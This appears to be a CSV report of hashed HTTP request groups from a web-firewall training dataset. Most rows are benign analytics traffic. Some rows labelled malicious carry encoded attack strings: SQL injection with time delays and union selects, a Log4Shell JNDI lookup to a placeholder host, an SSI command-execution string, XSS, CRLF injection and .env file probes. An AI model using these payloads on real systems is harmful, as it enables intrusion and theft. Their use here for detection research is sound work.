"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"payload_family_hash","256519aaa3672b893a93c8e7","2","0","openappsec_legitimate","normal","norm_legitimate_000150|norm_legitimate_000099","GET","/web/rest/statistics/customTracker","e=anupload.1&v=lg&p=indexPage"
"payload_family_hash","25bb1955c51c1be48e4a6556","2","0","openappsec_legitimate","normal","norm_legitimate_001784|norm_legitimate_001683","POST","/recs/v1/precs/preconfigured",""
"payload_family_hash","26899d82c5816663739df9aa","2","1","openappsec_malicious","sqli","pos_malicious_001790|pos_malicious_001332","POST","/",""
"payload_family_hash","26bf292e5df9cabf2cda5cdf","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002786|norm_modsec_learn_001023","GET","/","txId=205b86eb-1ec5-45c6-8502-abe7af457ca7"
"payload_family_hash","2837604098fbfd9b379384e5","2","1","openappsec_malicious","sqli","pos_malicious_002073|pos_malicious_001615","POST","/",""
"payload_family_hash","29434dbe7ce2209661afb3e3","2","1","openappsec_malicious","sqli","pos_malicious_001550|pos_malicious_002008","GET","/","p=%27%20or%20pg_sleep%285%29--"
"payload_family_hash","29d584d2115977656bf2d2b0","2","1","openappsec_malicious","log4shell","pos_malicious_001104|pos_malicious_001214","GET","/","p=%24%7Bjndi%3Armi%3A/fake.domain%3A1097/pentest%7D"
"payload_family_hash","2bdaa05c481746bbde4712bc","2","1","owasp_modsecurity","owasp_java_attack:444444|owasp_xss:444444","pos_owasp_modsec_000815|pos_owasp_modsec_002698","GET","/robots.txt",""
"payload_family_hash","2cd258e78009b9bcfe48d316","2","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_001005|pos_owasp_modsec_001616","GET","/config/.env",""
"payload_family_hash","2ce82aa72f70df5e4ab9970c","2","1","csic_2010","csic_anomalous","pos_csic_002555|pos_csic_002590","GET","/tienda1/publico/pagar.jsp","modo=%7C&precio=4628&B1=Confirmar"
"payload_family_hash","2db8af811060c3269a682854","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002779|norm_modsec_learn_002780","GET","/","tim=17%3A05%3A39.196&type=info&msg=Start%20Rendering%20Below%20Article%20Thumbnails%20%7C%20Card%202&llvl=2&id=7810&cv=20220811-9-RELEASE&lt=snap_timeOut_1_ctrl&pct=1"
"payload_family_hash","2e04abfb4a8205a5c4ea74fd","2","0","openappsec_legitimate","normal","norm_legitimate_002999|norm_legitimate_002937","GET","/event/app/companyCardIntegrated/getSupplierData.htm","detailId=1600994248467"
"payload_family_hash","2ebf20b0f8f6aed66d99e702","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001788|norm_modsec_learn_001787","GET","/","a=129738900&v=1216.487a282&to=ZFZVMBBYWhFZW0VRC10cchwSS1ERS1JCFyN2ZxhLSA%3D%3D&rst=65356&ck=1&ref=https://www.realtor.com/realestateandhomes-detail/3377-Johannesberg-Rd_North-Port_FL_34288_M55010-61389"
"payload_family_hash","2ec72882dfe2dec476eb4d1b","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002907|norm_modsec_learn_002908","GET","/","wv-check=53297&wv-type=0&wmode=0&wv-part=1&wv-hit=747375584&page-url=https%3A%2F%2Fwww.twentyfourseven.co.il%2Fhe%2F613510102.html&rn=123997627&browser-info=gdpr%3A14%3Aet%3A1660548655%3Aw%3A1903x969%3Av%3A860%3Az%3A180%3Ai%3A20220815103055%3Au%3A1660548510762459704%3Avf%3Anlzej4hetqp71c81qpn94%3Awe"
"payload_family_hash","2ef303d1dab9c21302d9e415","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002290|norm_modsec_learn_002289","GET","/","v=2&tid=G-BPNLXP3JQG&gtm=2oe9j0&_p=502081388&gcs=G111&gcd=G111&adr=0&cid=1196870682.1663660983&ul=en-us&sr=1920x1080&_fplc=0&_uc=GB&_rnd=922032557.1663661052&uaa=x86&uab=64&uafvl=Google%2520Chrome%3B105.0.5195.127%7CNot)A%253BBrand%3B8.0.0.0%7CChromium%3B105.0.5195.127&uamb=0&uam=&uap=Windows&uapv=7"
"payload_family_hash","2f0abc5c812bb4461726b4bf","2","1","csic_2010","csic_anomalous","pos_csic_001765|pos_csic_000484","POST","/tienda1/publico/entrar.jsp",""
"payload_family_hash","2fb118d7dabb95f41188c203","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001870|norm_modsec_learn_001253","GET","/","dataProviderId=189&userId=7178992442805220977"
"payload_family_hash","30bc033dbf35aa5a6f75da19","2","0","openappsec_legitimate","normal","norm_legitimate_000010|norm_legitimate_000021","POST","/r/api/personalize/customerEvents/events/publish","brand=flowers&entryBrand=flowers"
"payload_family_hash","311b75645cdcbfc3dd6af401","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000953|norm_modsec_learn_000954","GET","/","random=1662471097940&cv=9&fst=1662469200000&num=1&userId=abHGpfkc9x3pzSOggiueVAf24h&bg=ffffff&guid=ON&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa8v0&sendb=1&data=event%3Dpage_view&frm=0&url=https%3A%2F%2Fwww.crocs.co.uk%2Fc%2Fwomen%2Ffootwear"
"payload_family_hash","31729104c70adf3e0f30c26a","2","0","openappsec_legitimate","normal","norm_legitimate_000814|norm_legitimate_001426","GET","/track","action=conversion&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&conversion_type=ViewContent&aepn=pageView&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"payload_family_hash","31af595c34889aa6addf0696","2","0","openappsec_legitimate","normal","norm_legitimate_001913|norm_legitimate_001871","POST","/bulk",""
"payload_family_hash","31d18e8b68ada768c436606e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001572|norm_modsec_learn_001570","GET","/","src=http%3A%2F%2Fimage.nmv.naver.net%2Fblog_2022_08_08_1257%2F9c22e401-16d9-11ed-bcc7-505dac8c385b_01.jpg%23152x114%23m&type=ff264_180"
"payload_family_hash","31f1cc684b1a8659a817c8b6","2","0","openappsec_legitimate","normal","norm_legitimate_002775|norm_legitimate_002715","GET","/global",""
"payload_family_hash","31f4f3334374b77d4550f6bd","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_000060|pos_owasp_modsec_001004","GET","/xampp/.env",""
"payload_family_hash","3252fbee29617edd300a9b64","2","0","openappsec_legitimate","normal","norm_legitimate_001115|norm_legitimate_001111","GET","/privacy_sandbox/pixel/register/trigger/","id=680435655455279&ev=PageView&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&rl=&if=false&ts=1719747606663&cd[page_type]=SHOPPING%20CART&cd[page_name]=MINICART%20OVERLAY&cd[previous_page_name]=PLP%7CG_KIDS%7CPR_SHOES%7CAG_INFANT_TODDLER&cd[page_v"
"payload_family_hash","329bd9218cca1748e78208ea","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000566|norm_modsec_learn_000565","GET","/","w=135&h=200&c=7&r=0&o=5&pid=1.7"
"payload_family_hash","32b355b728dc7f436e11d7fb","2","0","openappsec_legitimate","normal","norm_legitimate_001274|norm_legitimate_001192","GET","/embeddedservice/5.0/esw.html","parent=https://www.adidas.com/us/runfalcon-5-running-shoes/IH7760.html"
"payload_family_hash","348a4a56ecfce4dd01006b32","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002481|norm_modsec_learn_002498","GET","/","id=1467345010025038&ev=fb_page_view&dl=https%3A%2F%2Ftoysim.co.il%2Fproduct%2Fcozi-odell-octopus%2F&rl=https%3A%2F%2Ftoysim.co.il%2Fproduct-category%2Fnew-born-and-babys%2F&if=false&ts=1662618289994&sw=1920&sh=1080&at="
"payload_family_hash","34aedf4f7d1953debee621b9","2","0","openappsec_legitimate","normal","norm_legitimate_002752|norm_legitimate_002737","GET","/login/gql/gql-login/redirect","ASFC.CLIENT.COOKIE=wvVrwFU0GA5TmlHA6opEFqNcHeRn1tN7Z501uQSE0acCMOM7OiqN7M7muuVwP%2BEq9T0J3Ade5vg85fZzxd5afdM%2BxLwbZkbcwrA9o2ZkHDX1i6aaO7C9XIYkg8R1QkYcRlkajTeOfyefTTpgATPx4RAmJzInvR5oL2HC%2F3QrudD1Yga9Mv1IHCi7j3dBPuiMJKxfMM%2BMFISlCTXs%2BIe0wxb%2B7WWkmuY6K%2Bs2KRSwASNg6eVO7ezair9MIGMOzZf%2F6KV3qN1oU"
"payload_family_hash","35bc7e76b333f662790a3572","2","0","openappsec_legitimate","normal","norm_legitimate_001451|norm_legitimate_001490","GET","/track/up","adv=ygdrgdy&ref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fcheckout&upid=186z53b&upv=1.1.0&vf=USD&TD1=CHECKOUT|ADDRESS&TD9=&Geo=US&TD10=14&paapi=1"
"payload_family_hash","3648580cd96a0a8ca9a78125","2","0","openappsec_legitimate","normal","norm_legitimate_002311|norm_legitimate_002152","GET","/pagead/viewthroughconversion/972690427/","random=1720601439964&cv=9&fst=1720601439964&num=1&label=dGhYCKWPzwUQ-6fozwM&guid=ON&resp=GooglemKTybQhCsO&eid=466465926&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=2&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&data=hotelid%3D271631%3Bpagetypeid%3D35%3Bcityid%3D17072%3Bcheckin%3D2024"
"payload_family_hash","36b944d768045fc77b57f0ac","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002158|norm_modsec_learn_002159","GET","/","source_url=%2Fpin%2F276338127127234383%2F%3Fnic_v3%3D1a1WDa7xf&data=%7B%22options%22%3A%7B%22url%22%3A%22%2Fv3%2Foffsite%2F%22%2C%22data%22%3A%7B%22check_only%22%3Atrue%2C%22client_tracking_params%22%3A%22CwABAAAAEDEzMjg1MDIzMzY1MzA2OTcGAAMABwsABwAAAApuZ2FwaS9wcm9kAA%22%2C%22pin_id%22%3A%22276338127"
"payload_family_hash","3701fbe754e2748d6dfced43","2","0","openappsec_legitimate","normal","norm_legitimate_002877|norm_legitimate_002879","GET","/openservice/gatewayService","_tb_token_=e3b8e3385546b&endpoint=pc&modelId=11226"
"payload_family_hash","3713f9e4b85b0eb058c56e92","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002447|norm_modsec_learn_002446","GET","/","external-domain=music.yandex.ru&overembed=no&__t=1663226424028"
"payload_family_hash","37ec2867ebbe2d6c3e4f7240","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001323|norm_modsec_learn_001324","GET","/","id=1848645131948925&ev=PageView&dl=https%3A%2F%2Fwww.marksandspencer.com%2Fhe-il%2Fl%2F%25D7%25A0%25D7%25A9%25D7%2599%25D7%259D%2F%25D7%2592%25D7%2599%25D7%25A0%25D7%25A1%2F%3Fsrule%3Dprice-high-to-low&rl=https%3A%2F%2Fwww.marksandspencer.com%2Fhe-il%2Fjersey-high-neck-maxi-smock-dress%2Fp%2FP605366"
"payload_family_hash","381b9858833506bfd0b0fcbf","2","1","csic_2010","csic_anomalous","pos_csic_001318|pos_csic_000843","GET","/tienda1/publico/vaciar.jsp","B2=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C"
"payload_family_hash","39bc38e8af949b3060c202b5","2","1","openappsec_malicious","sqli","pos_malicious_001600|pos_malicious_002058","GET","/","p=select%20current_setting%28%27config_file%27%29%3B"
"payload_family_hash","3a6b45df5a774ff6e15b80c4","2","0","openappsec_legitimate","normal","norm_legitimate_001049|norm_legitimate_001127","GET","/activityi;src=4599367;type=products;cat=prddtl;ord=1;num=9137207684021;npa=0;gac=UA-41273132-1%3AEAIaIQobChMI-JrG1Z6DhwMV9EpHAR17gA-NEAAYASAAEgK0aPD_BwE;auiddc=1339420619.1719747533;u1=PRODUCT%7CGRAND%20COURT%202.0%20SHOES%20KIDS%20(ID0741);u3=KIDS;u4=LIFESTYLE;u6=CLOUD%20WHITE%20%2F%20BLISS%20PINK%20%2F%20CLEAR%20PINK;u7=MDT59;u8=INLINE;u9=SPORTSWEAR;u10=;u11=0;u12=0;u14=FALSE;u16=SHOES;u17=MDT59;u18=40.00;u19=ID0741;u21=FULL%20PRICE;u23=;u25=TEST;u26=40;u28=GRAND%20COURT%202.0%20SHOES%20KIDS;u30=US;u31=NEW;gdid=dYmQxMT;ps=1;pcor=835796677;uaa=x86;uab=64;uafvl=Not%252FA)Brand%3B8.0.0.0%7CChromium%3B126.0.6478.127%7CGoogle%2520Chrome%3B126.0.6478.127;uamb=0;uam=;uap=Windows;uapv=12.0.0;uaw=0;frm=0;gtm=45fe46q0v9156756886za200;gcs=G111;gcd=13t3t3t3t5;dma=0;tag_exp=0;epver=2;match_id=8028816474865468;~oref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html",""
"payload_family_hash","3ca28374d043a0971d5b37a2","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002118|norm_modsec_learn_002119","GET","/","random=1663172475380&cv=9&fst=1663172475380&num=1&currency_code=USD&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=10&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa9c0&sendb=1&ig=1&data=event%3Dpage_view%3Becomm_pagetype%3Dcreation%20path&frm=0&url=https"
"payload_family_hash","3cd0687f00de4e4dbd93144b","2","1","openappsec_malicious","sqli","pos_malicious_001835|pos_malicious_001377","POST","/",""
"payload_family_hash","3d84b63a292918fc78d28c97","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002122|norm_modsec_learn_002056","GET","/","random=1772999686&cv=9&fst=1660653127529&num=1&value=0&label=oTDnCKnD4ZYBEOqfh_UC&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=9&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg8f0&sendb=1&ig=1&gclaw=Cj0KCQjwgO2XBhCaARIsANrW2X1qSfOJTOkzDAMHelVIjc3ciPRN"
"payload_family_hash","3e0f0ca33fd6b8f42c206a7e","2","1","openappsec_malicious","log4shell","pos_malicious_001121|pos_malicious_001011","POST","/",""
"payload_family_hash","3e61181277ffefe45e3624e2","2","1","openappsec_malicious","sqli","pos_malicious_002118|pos_malicious_001660","POST","/",""
"payload_family_hash","411fad331f70550dbf3b9d7c","2","0","openappsec_legitimate","normal","norm_legitimate_001237|norm_legitimate_001245","GET","/td/rul/986797384","random=1719747629062&cv=11&fst=1719747629062&fmt=3&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fsearch%3Fq%3Drun&ref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3Fforce"
"payload_family_hash","42215b55b9b3ef7edfc3fe70","2","0","csic_2010","csic_normal","norm_csic_000278|norm_csic_002274","POST","/tienda1/publico/autenticar.jsp",""
"payload_family_hash","4281e837cea3fc95b53bad02","2","1","modsec_learn_sqli|openappsec_malicious","modsec_learn_sqli:openappsec|sqli","pos_modsec_learn_sqli_001070|pos_malicious_001306","GET","/","p=%281%29and%28SELECT%20%2A%20from%20db.users%29%3D%281%29"
"payload_family_hash","4396f9614da6b771ffaadc95","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000386|norm_modsec_learn_000315","GET","/","random=1663746978453&cv=9&fst=1663746978453&num=1&npa=1&label=wqmKCIzrlqMCEOHew8oC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=1&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F4620401.fls.doubleclick.net%2Factivityi%3B"
"payload_family_hash","43e6425dbe36b42c1530ff32","2","1","openappsec_malicious","sqli","pos_malicious_002176|pos_malicious_001718","POST","/",""
"payload_family_hash","441e4e3f0df7e27639525dd7","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001361|norm_modsec_learn_002524","GET","/","id=DC-4171764"
"payload_family_hash","45468dbeb3270cada72ef69b","2","0","openappsec_legitimate","normal","norm_legitimate_000672|norm_legitimate_001966","POST","/v1:GetModels","key=AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgw"
"payload_family_hash","461f3ff37984a058c9dbd743","2","1","modsec_learn_sqli","modsec_learn_sqli:sqli_kaggle","pos_modsec_learn_sqli_002161|pos_modsec_learn_sqli_002167","GET","/","p=select+++%28++case+when+++%28++4755++%3D++4784++%29+++then+1+else+4755%2A++%28++select+4755+from+master..sysdatabases++%29+++end++%29++--"
"payload_family_hash","46bbb19088600b86c9346949","2","1","csic_2010","csic_anomalous","pos_csic_001072|pos_csic_000659","GET","/tienda1/global/estilos.css.inc",""
"payload_family_hash","46f515a26b1630852594fd2d","2","1","csic_2010","csic_anomalous","pos_csic_002538|pos_csic_001817","POST","/tienda1/publico/anadir.jsp",""
"payload_family_hash","476a113639d234277aaa7860","2","1","openappsec_malicious","sqli","pos_malicious_001771|pos_malicious_001313","POST","/",""
"payload_family_hash","479c9b45bb0fa96a84add3cd","2","1","openappsec_malicious","log4shell","pos_malicious_001162|pos_malicious_001052","POST","/",""
"payload_family_hash","48e94e2895fd5d66c6d32ced","2","1","openappsec_malicious","sqli","pos_malicious_002011|pos_malicious_001553","POST","/",""
"payload_family_hash","494353d89cfcaa34bc97db56","2","0","openappsec_legitimate","normal","norm_legitimate_002623|norm_legitimate_002666","GET","/pagead/conversion/693117987/","random=1720598699723&cv=9&fst=1720598699688&num=3&npa=1&label=fVJsCOCB5aMCEKPIwMoC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261%2C466465925%2C512247838&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&gclaw=EAIaIQobChMIp-6vxIGchwMVDV1HAR3s0g-0"
"payload_family_hash","4a1fb68090d9dd24a439c1d7","2","1","csic_2010","csic_anomalous","pos_csic_001445|pos_csic_002553","GET","/tienda1/global/estilos.css.Old",""
"payload_family_hash","4af84744093b1cbf2c1f1a82","2","1","owasp_modsecurity","owasp_lfi_rfi:930130","pos_owasp_modsec_000879|pos_owasp_modsec_001685","GET","/.env.travis",""
"payload_family_hash","4b3430184609c47c550c47d8","2","1","csic_2010","csic_anomalous|csic_xss","pos_csic_001489|pos_csic_001907","GET","/tienda1/publico/vaciar.jsp","B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org"
"payload_family_hash","4b8bc08d5eca2e4406f68c65","2","0","openappsec_legitimate","normal","norm_legitimate_001682|norm_legitimate_000333","GET","/dest5.html","d_nsid=0"
"payload_family_hash","4bd724f82e358b6641ebc25b","2","0","openappsec_legitimate","normal","norm_legitimate_001196|norm_legitimate_001190","GET","/horizon/adidasgroup","QUANTUM_WARNING=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&hit=1644816663b7dcdde3942fc7&s=aa3bbc1a791d8c7348e559873f77a0d2&CORS_LINK=https%3A%2F%2Fadidas.my.salesforce-sites.com%2FadidasContact%2Fservlet%2Fservlet.FileDownload%3Ffile%3D0150O00000"
"payload_family_hash","4be2aa9945d5033886a97baa","2","1","csic_2010","csic_anomalous","pos_csic_000767|pos_csic_001491","GET","/tienda1/publico/entrar.jsp","errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--"
"payload_family_hash","4c1abd0175276fef7ab96733","2","0","openappsec_legitimate","normal","norm_legitimate_001906|norm_legitimate_001865","POST","/bulk",""
"payload_family_hash","4c6389a9f9b3e7318a399c6e","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000879|norm_modsec_learn_000880","GET","/","partner_id=2884&partner_url=https%3A%2F%2Ftr.snapchat.com%2Fcm%2Fp%3Frand%3D1663195872103%26pnid%3D140%26pcid%3D%24%7BTA_DEVICE_ID%7D"
"payload_family_hash","4ce7a3a9e91744cb2fd00f90","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001124|norm_modsec_learn_001125","GET","/","wv-check=3341&wv-type=0&wmode=0&wv-part=10&wv-hit=660797882&page-url=https%3A%2F%2Fwww.gomobile.co.il%2Forders%2Fgomobile%2Fnew%3FaffiliatorId%3Dnull%26_ga%3D2.7645873.260054965.1660559929-541622865.1660559929%23GoToStep3%3Fcart_content_with_upgrades%3Ditem_id_5062308%3D%253E1%3D%253Eu%25E2%2580%259"
"payload_family_hash","4d0e5c3d979c21edadf58e69","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001525|norm_modsec_learn_001548","GET","/","random=1662450322089&cv=9&fst=1662450322089&num=1&npa=1&label=faEVCOqfwuoBELi-itUC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=7&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F3801950.fls.doubleclick.net%2Factivityi%3B"
"payload_family_hash","4db5ecd834893c9be73e4c55","2","1","csic_2010","csic_anomalous|csic_crlf","pos_csic_000060|pos_csic_002237","GET","/tienda1/publico/caracteristicas.jsp","id=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727"
"payload_family_hash","4e6a5dfe52cd1c66584a83f4","2","0","openappsec_legitimate","normal","norm_legitimate_002742|norm_legitimate_002779","POST","/pharos",""
"payload_family_hash","4ed0a3fabacca417b45ee937","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001862|norm_modsec_learn_001236","GET","/","currencyCode=ILS&discount=0&eventName=onProductViewed&eventTimestamp=1660541206829&executionTime=232&experienceCountry=IL&isUSHashedEmail=false&loggedIn=N&orderId=&pathName=/il/t/air-jordan-1-mid-shoe-xMNLGv/BQ6472-110&productsCurrentPrice=529.9&productsCurrentPriceTotal=529.9&productsFullPrice=529."
"payload_family_hash","4f45395881953825d65b848d","2","1","csic_2010","csic_anomalous","pos_csic_000984|pos_csic_002861","GET","/tienda1/asf-logo-wide.gif/",""
"payload_family_hash","4fb583ef7006d0068797e049","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001946|norm_modsec_learn_001945","GET","/","imwidth=640"
"payload_family_hash","501db94de32f09ec6b09809c","2","0","openappsec_legitimate","normal","norm_legitimate_001254|norm_legitimate_001244","GET","/privacy_sandbox/pixel/register/trigger/","id=680435655455279&ev=PageView&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html&rl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&if=false&ts=1719747631084&cd[page_type]=SEARCH&cd[page_name]=SEARCH%20RESULTS&cd[previous_"
"payload_family_hash","50a06ff7106991fe09f8b0f5","2","1","openappsec_malicious","sqli","pos_malicious_001923|pos_malicious_001465","POST","/",""
"payload_family_hash","50cb0900c4f9afaa52403994","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000862|norm_modsec_learn_000863","GET","/","object=https%3A%2F%2Foglobo.globo.com%2Fpolitica%2Feleicoes-2022%2Fnoticia%2F2022%2F09%2Fapos-ataque-a-jornalista-vera-magalhaes-deputado-bolsonarista-pede-desculpas-a-tarcisio.ghtml&Referrer=https%253A%252F%252Foglobo.globo.com%252Fkogut%252Fcritica%252F2022%252F06%252Fla-casa-de-papel-coreia-e-exe"
"payload_family_hash","52679b14b549dd05757cceaa","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002344|norm_modsec_learn_002345","GET","/","T=B&u=https%3A%2F%2Fwww.t-mobile.com%2Fsmart-watch%2Fapple-watch-se-40mm%3Fsku%3D***********96&t=1663681624950&v=1663681625507&s=338e6b6523e2e777f09c4d0a4f489cc3&U=e2c7a23690baebf021d4327828868e33&z=1&S=0&N=0&P=0"
"payload_family_hash","52d915c224bb7befb3e54f0f","2","0","csic_2010","csic_normal","norm_csic_001686|norm_csic_000253","POST","/tienda1/publico/registro.jsp",""
"payload_family_hash","5449ea09213acb4efa89b60a","2","0","openappsec_legitimate","normal","norm_legitimate_000847|norm_legitimate_001202","GET","/cm/s","bt=1d53c387&pnid=140&cb=1719747538368&u_scsid=32c2ae9f-e9c7-495f-a912-26e7a9df83f7&u_sclid=ddff2717-41f8-492b-a6bb-5de69086337a"
"payload_family_hash","55cd2bd03577f8b5cd6fd89f","2","0","openappsec_legitimate","normal","norm_legitimate_002593|norm_legitimate_002591","GET","/gtag/destination","id=AW-788919195&l=dataLayer&cx=c"
"payload_family_hash","56049d6ad59942a616fa9317","2","0","openappsec_legitimate","normal","norm_legitimate_000749|norm_legitimate_000752","GET","/signals/config/3122845081335855","v=2.9.159&r=stable&domain=www.adidas.com&hme=446fb981c8c3baeb03730fe3cbd404f7f15f64c693f24c7fe75da498bc2c95d8&ex_m=67%2C113%2C100%2C104%2C58%2C3%2C93%2C66%2C15%2C91%2C84%2C49%2C51%2C160%2C163%2C174%2C170%2C171%2C173%2C28%2C94%2C50%2C73%2C172%2C155%2C158%2C167%2C168%2C175%2C122%2C39%2C33%2C134%2C14%2"
"payload_family_hash","5716d68973aae06d27f0ea47","2","0","csic_2010","csic_normal","norm_csic_001999|norm_csic_001759","POST","/tienda1/miembros/editar.jsp",""
"payload_family_hash","57532f298bf971dfaed14992","2","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000623|norm_modsec_learn_000622","GET","/","T=B&u=https%3A%2F%2Fsignup.ebay.com%2Fpa%2Fcrte%3Fsiteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252Fmys%252Fhome%253Fsource%253DGBH%26signInUrl%3Dhttps%253A%252F%252Fwww.ebay.com%252Fsignin%253Fsgn%253Dreg%2526siteid%253D0%2526co_partnerId%253D0%2526U"
"payload_family_hash","5787a47a0a181868dda9b15c","2","1","exploitdb","sqli","pos_luongvd_001481|pos_luongvd_001480","GET","/index.php","n=1&id=-1+union+select+1,version"
"payload_family_hash","57b0bece508dfd3c8facc3fd","2","0","openappsec_legitimate","normal","norm_legitimate_001056|norm_legitimate_001054","GET","/privacy_sandbox/pixel/register/trigger/","id=680435655455279&ev=PageView&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&rl=&if=false&ts=1719747600503&cd[page_type]=PLP&cd[previous_page_name]=PRODUCT%7CGRAND%20COURT%202.0%20SHOES%20KIDS%20(ID0741)&cd[page_visited]=6&sw=1920&sh=1080&v=2.9.1"
